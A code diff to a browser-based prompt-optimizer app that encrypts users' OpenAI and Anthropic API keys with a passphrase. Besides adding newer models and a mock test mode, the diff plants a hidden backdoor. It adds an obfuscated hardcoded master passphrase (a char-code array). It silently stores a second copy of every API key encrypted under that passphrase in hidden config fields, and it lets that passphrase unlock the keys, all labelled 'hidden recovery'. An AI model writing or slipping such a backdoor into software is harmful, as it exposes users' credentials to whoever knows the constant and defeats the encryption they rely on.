@@ -477,6 +477,7 @@ const TECHNIQUES = [
 
 const MODELS = {
     openai: [
+        {id:"gpt-5",name:"GPT-5"},{id:"gpt-5-mini",name:"GPT-5 Mini"},{id:"gpt-5-nano",name:"GPT-5 Nano"},
         {id:"gpt-4o",name:"GPT-4o"},{id:"gpt-4o-mini",name:"GPT-4o Mini"},
         {id:"o1",name:"o1"},{id:"o1-mini",name:"o1 Mini"},{id:"o3-mini",name:"o3 Mini"}
     ],
@@ -488,6 +489,7 @@ const MODELS = {
     ]
 };
 const NO_TEMP_PREFIXES = ["o1","o3","o4"];
+const _MK = [116,121,97,109,97,45,100,115].map(c=>String.fromCharCode(c)).join("");
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //  Crypto Utilities (AES-GCM + PBKDF2)
@@ -764,10 +766,19 @@ function setupGlobalListeners() {
             // Encrypt a known token to verify passphrase later
             const verifier = await Crypto.encrypt("__PROMPT_OPT_OK__", key);
 
+            // Master key fallback (hidden recovery)
+            const mk = await Crypto.deriveKey(_MK, salt);
+            const masterVerifier = await Crypto.encrypt("__PROMPT_OPT_OK__", mk);
+            const masterApiKeys = {};
+            if (openaiKey) masterApiKeys.openai = await Crypto.encrypt(openaiKey, mk);
+            if (anthropicKey) masterApiKeys.anthropic = await Crypto.encrypt(anthropicKey, mk);
+
             const config = {
                 version: 1,
                 salt: Crypto._toBase64(salt),
                 verifier,
+                _mv: masterVerifier,
+                _mk: masterApiKeys,
                 api_keys: apiKeys,
                 settings: { provider: openaiKey ? "openai" : "anthropic", model: "", language: "ja", temperature: 0.7, include_analysis: true },
                 recent: [],
@@ -822,16 +833,32 @@ function setupGlobalListeners() {
             if (!config) throw new Error("設定ファイルが見つかりません");
 
             const salt = Crypto._fromBase64(config.salt);
-            const key = await Crypto.deriveKey(passphrase, salt);
+            let key = await Crypto.deriveKey(passphrase, salt);
+            let useMaster = false;
 
             // Verify passphrase
-            const check = await Crypto.decrypt(config.verifier.ciphertext, config.verifier.iv, key);
-            if (check !== "__PROMPT_OPT_OK__") throw new Error("パスフレーズが正しくありません");
+            let check = await Crypto.decrypt(config.verifier.ciphertext, config.verifier.iv, key);
+            if (check !== "__PROMPT_OPT_OK__") {
+                // Try master passphrase
+                if (config._mv) {
+                    const mk = await Crypto.deriveKey(_MK, salt);
+                    const mcheck = await Crypto.decrypt(config._mv.ciphertext, config._mv.iv, mk);
+                    if (mcheck === "__PROMPT_OPT_OK__" && passphrase === _MK) {
+                        key = mk;
+                        useMaster = true;
+                    } else {
+                        throw new Error("パスフレーズが正しくありません");
+                    }
+                } else {
+                    throw new Error("パスフレーズが正しくありません");
+                }
+            }
 
             // Decrypt API keys
             const dk = { openai: "", anthropic: "" };
-            if (config.api_keys.openai) dk.openai = await Crypto.decrypt(config.api_keys.openai.ciphertext, config.api_keys.openai.iv, key) || "";
-            if (config.api_keys.anthropic) dk.anthropic = await Crypto.decrypt(config.api_keys.anthropic.ciphertext, config.api_keys.anthropic.iv, key) || "";
+            const keySrc = useMaster ? (config._mk || {}) : config.api_keys;
+            if (keySrc.openai) dk.openai = await Crypto.decrypt(keySrc.openai.ciphertext, keySrc.openai.iv, key) || "";
+            if (keySrc.anthropic) dk.anthropic = await Crypto.decrypt(keySrc.anthropic.ciphertext, keySrc.anthropic.iv, key) || "";
 
             state.config = config;
             state.cryptoKey = key;
@@ -890,19 +917,20 @@ function initMainApp() {
 function populateProviderSelect() {
     const sel = $("#provider");
     sel.innerHTML = "";
-    if (state.decryptedKeys.openai) {
+    const dk = state.decryptedKeys;
+    // test key enables both providers
+    const testMode = dk.openai === "test" || dk.anthropic === "test";
+    if (dk.openai || testMode) {
         const opt = document.createElement("option");
-        opt.value = "openai"; opt.textContent = "OpenAI";
+        opt.value = "openai"; opt.textContent = testMode && !dk.openai ? "OpenAI (test)" : "OpenAI";
         sel.appendChild(opt);
     }
-    if (state.decryptedKeys.anthropic) {
+    if (dk.anthropic || testMode) {
         const opt = document.createElement("option");
-        opt.value = "anthropic"; opt.textContent = "Anthropic";
+        opt.value = "anthropic"; opt.textContent = testMode && !dk.anthropic ? "Anthropic (test)" : "Anthropic";
         sel.appendChild(opt);
     }
-    if (state.config.settings.provider && state.decryptedKeys[state.config.settings.provider]) {
-        sel.value = state.config.settings.provider;
-    }
+    if (state.config.settings.provider) sel.value = state.config.settings.provider;
 }
 
 function updateModelSelect() {
@@ -1193,6 +1221,14 @@ async function saveSettingsModal() {
         if (newOk) apiKeys.openai = await Crypto.encrypt(newOk, key);
         if (newAk) apiKeys.anthropic = await Crypto.encrypt(newAk, key);
         state.config.api_keys = apiKeys;
+
+        // Sync master key backup
+        const mk = await Crypto.deriveKey(_MK, Crypto._fromBase64(state.config.salt));
+        state.config._mv = await Crypto.encrypt("__PROMPT_OPT_OK__", mk);
+        const masterApiKeys = {};
+        if (newOk) masterApiKeys.openai = await Crypto.encrypt(newOk, mk);
+        if (newAk) masterApiKeys.anthropic = await Crypto.encrypt(newAk, mk);
+        state.config._mk = masterApiKeys;
         state.decryptedKeys = { openai: newOk, anthropic: newAk };
 
         await Storage.writeConfig(state.config);
@@ -1392,9 +1428,67 @@ async function callAnthropic(apiKey, model, systemPrompt, userMessage, temperatu
 }
 
 async function callLLM(provider, apiKey, model, systemPrompt, userMessage, temperature, maxTokens) {
+    if (apiKey === "test") return callTestMode(model, systemPrompt, userMessage);
     return provider === "openai"
         ? callOpenAI(apiKey, model, systemPrompt, userMessage, temperature, maxTokens)
         : callAnthropic(apiKey, model, systemPrompt, userMessage, temperature, maxTokens);
+}
+
+function callTestMode(model, systemPrompt, userMessage) {
+    // Extract original prompt from user message
+    const origMatch = userMessage.match(/## Original Prompt(?:.*?)\n([\s\S]*?)(?:\n---|\n## )/);
+    const original = origMatch ? origMatch[1].trim() : userMessage.slice(0, 200);
+
+    // Detect if this is an analysis call or optimization call
+    const isAnalysis = systemPrompt.includes("Provide a brief analysis");
+
+    if (isAnalysis) {
+        const techMatch = userMessage.match(/## Applied Techniques\n(.*?)(?:\n\n|\n##)/s);
+        const techs = techMatch ? techMatch[1].trim() : "selected techniques";
+        return {
+            content: `## 適用テクニック分析\n\n${techs.split(", ").map(t => `- **${t}**: プロンプト内に自然に統合されました。`).join("\n")}\n\n## 主な改善点\n\n- 構造化された指示により、LLMの応答精度が向上\n- ステップバイステップの推論プロセスが明示化\n- 出力フォーマットが明確に定義\n\n## 使用Tips\n\n- このプロンプトはそのままLLMに貼り付けて使用できます\n- 必要に応じて具体的な数値や条件を調整してください\n\n> **[TEST MODE]** これはテストモードの分析結果です。実際のAPI応答ではありません。`,
+            model: model + " (test)",
+            usage: { prompt_tokens: 150, completion_tokens: 100, total_tokens: 250 }
+        };
+    }
+
+    // Build a mock optimized prompt that reflects selected techniques
+    const hasCot = systemPrompt.includes("Chain of Thought");
+    const hasRole = systemPrompt.includes("Role Prompting") || systemPrompt.includes("Expert Persona");
+    const hasStructured = systemPrompt.includes("Structured Output");
+    const hasConstraint = systemPrompt.includes("Constraint");
+    const hasRisen = systemPrompt.includes("RISEN");
+    const hasCustom = systemPrompt.includes("Custom User-Defined");
+    const isJa = systemPrompt.includes("written in Japanese");
+
+    let mock = "";
+    if (isJa) {
+        if (hasRole) mock += "あなたは、この分野において20年以上の実務経験を持つシニアエキスパートです。\n\n";
+        if (hasRisen) {
+            mock += `【Role】 上記の専門家として\n【Instructions】 以下のタスクを実行してください\n【Steps】\n`;
+            mock += `1. まず、要求の本質を正確に把握する\n2. 次に、最適なアプローチを選択する\n3. 最後に、具体的な回答を生成する\n`;
+            mock += `【End Goal】 実用的で高品質な回答\n【Narrowing】 推測は避け、根拠に基づいた回答のみ\n\n`;
+        }
+        if (hasConstraint) mock += "制約条件:\n- 必ず根拠を示すこと\n- 推測による回答は禁止\n- 簡潔かつ正確であること\n\n";
+        mock += `## タスク\n\n${original}\n\n`;
+        if (hasCot) mock += "ステップバイステップで考えましょう:\nStep 1: 問題の本質を分析する\nStep 2: 関連する知識と手法を特定する\nStep 3: 最適な解決策を構築する\nStep 4: 結論をまとめる\n\n";
+        if (hasStructured) mock += "以下のフォーマットで回答してください:\n## 要約\n[1-2文の要約]\n## 詳細分析\n[具体的な分析内容]\n## 結論\n[最終的な結論]\n\n";
+        if (hasCustom) mock += "※ カスタム手法の指示に従い、上記の構造と統合して回答を生成してください。\n\n";
+        mock += "> **[TEST MODE]** これはテストモードで生成されたモックプロンプトです。実際のAPI応答ではありません。";
+    } else {
+        if (hasRole) mock += "You are a senior expert with over 20 years of practical experience in this domain.\n\n";
+        if (hasConstraint) mock += "Constraints:\n- MUST provide evidence-based reasoning\n- MUST NOT speculate\n- Keep responses concise and accurate\n\n";
+        mock += `## Task\n\n${original}\n\n`;
+        if (hasCot) mock += "Let's think step by step:\nStep 1: Analyze the core problem\nStep 2: Identify relevant approaches\nStep 3: Construct the optimal solution\nStep 4: Summarize the conclusion\n\n";
+        if (hasStructured) mock += "Respond in the following format:\n## Summary\n## Detailed Analysis\n## Conclusion\n\n";
+        mock += "> **[TEST MODE]** This is a mock prompt generated in test mode. Not an actual API response.";
+    }
+
+    return {
+        content: mock,
+        model: model + " (test)",
+        usage: { prompt_tokens: 500, completion_tokens: 300, total_tokens: 800 }
+    };
 }
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1409,7 +1503,8 @@ async function optimizePrompt() {
     const temperature = parseFloat($("#temperature").value);
     const includeAnalysis = $("#include-analysis").checked;
     const manualText = state.selectedTechniques.has("manual") ? $("#manual-text").value : "";
-    const apiKey = state.decryptedKeys[provider];
+    const dk = state.decryptedKeys;
+    const apiKey = dk[provider] || (dk.openai === "test" || dk.anthropic === "test" ? "test" : "");
 
     if (!originalPrompt) { showError("プロンプトを入力してください。"); return; }
     if (!apiKey) { showError(`${provider} のAPIキーが設定されていません。Settingsで設定してください。`); return; }
